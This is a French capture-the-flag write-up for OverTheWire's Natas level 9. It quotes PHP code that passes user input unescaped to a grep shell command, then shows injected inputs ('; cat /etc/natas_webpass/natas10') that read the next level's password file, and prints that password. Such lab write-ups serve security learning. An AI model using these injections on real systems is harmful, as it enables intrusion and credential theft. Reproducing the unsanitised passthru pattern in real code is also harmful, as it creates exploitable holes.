## Over-The-Wire -writeup-
### Natas9 (http://natas9.natas.labs.overthewire.org/)

---
#### Etape 1

On a un box de recherche qui, d'après le sourcecode mis à disposition, cherche chaque mot contenant l'input de l'utilisateur dans un dictionnaire.txt

Voici la fonction php:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

**On sait aussi que les mots de passes sont stockés dans /etc/natas_webpass/**, et la ligne de recherche dans le dictionnaire est vulnérable: `passthru("grep -i $key dictionary.txt");`

Il suffit de remplacer la variable $key par ";" pour terminer la ligne, et à la suite une commande qui nous permettrais de voir le contenu de *webpass*:

---
#### Etape 2

Tapons `; ls -la /etc/natas_webpass/natas10"` dans le box de recherche, et on obtient:
> -r--r----- 1 natas10 natas9     33 Dec 20  2016 /etc/natas_webpass/natas10  
> -rw-r----- 1 natas9  natas9 460878 Dec 15  2016 dictionary.txt

Et si on rentre `; type /etc/natas_webpass/natas10"`, on trouve que le fichier natas10 est un ASCII text.  

---
#### Etape 3


Il suffit de rentrer `; cat /etc/natas_webpass/natas10"` pour voir à quoi ressemble le fichier, et après avoir fait ça la page renvoie: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu.

---
Mot de passe: **nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu**
